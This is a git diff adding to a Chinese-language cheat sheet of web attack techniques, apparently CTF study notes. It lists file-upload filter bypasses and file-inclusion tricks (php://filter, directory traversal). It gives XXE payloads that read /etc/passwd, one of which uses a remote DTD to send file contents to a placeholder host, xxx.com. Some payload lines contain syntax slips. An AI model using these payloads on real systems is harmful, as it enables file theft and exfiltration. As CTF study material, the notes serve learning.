@@ -104,15 +104,76 @@ vim -r 交换文件还原
 3. DOM型XSS
 
 ### 六.文件上传和文件解析
+文件上传：
+- 本地js
+- filename文件后缀名
+- Content-Type文件类型
+- filename+Content-Type绕过
+- 文件内容绕过 图片马，声音马
+
+文件解析
+
 
 ### 八.文件包含
+题眼：
+page=
+file=
+action=
+
+主要函数：
+include()
+require()
+file_get_contents()
+
+主要姿势：
+php://input 标准输入，post中带输入内容
+php://filter/read=convert.base64-encode/resource=文件名   标准输出，输出指定文件内容。
+../../ 目录穿越
+
+
 1. 本地文件包含
+引用的是服务器上的文件
+
 2. 远程文件包含
+引用的是非服务器上的文件，一般默认关闭
+
 
 ### 九.XXE
+XML外部实体注入，当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行，内网端口探测、攻击内网网站等目的。
 
+
+必备条件：
+Content-Type: application/xml
+post请求中传入poc
+
+一般poc:
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foo[ 
+<!ENTITY f SYSTEM "file:///etc/passwd">
+]>
+<foo>&f;</foo>
+```
+
+
+远程DTD
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "http://xxx.com/xxe_file.dtd">
+<data>&xxe;<data>
+```
+http://xxx.com/xxe_file.dtd:
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % all "><!ENTITY xxe SYSTEM 'http://xxx.com/?%file;'>">
+%all
+```
+引用自https://www.freebuf.com/articles/web/177979.html
 
 ### 十.命令执行
+经常flag就在同级目录下面的文件名或者文件中。可以通过ls,cat等命令查看。
+或者利用语言所带的查看文件内容和查看目录下文件查看。
+
 
 ### 十一.远程代码执行
 
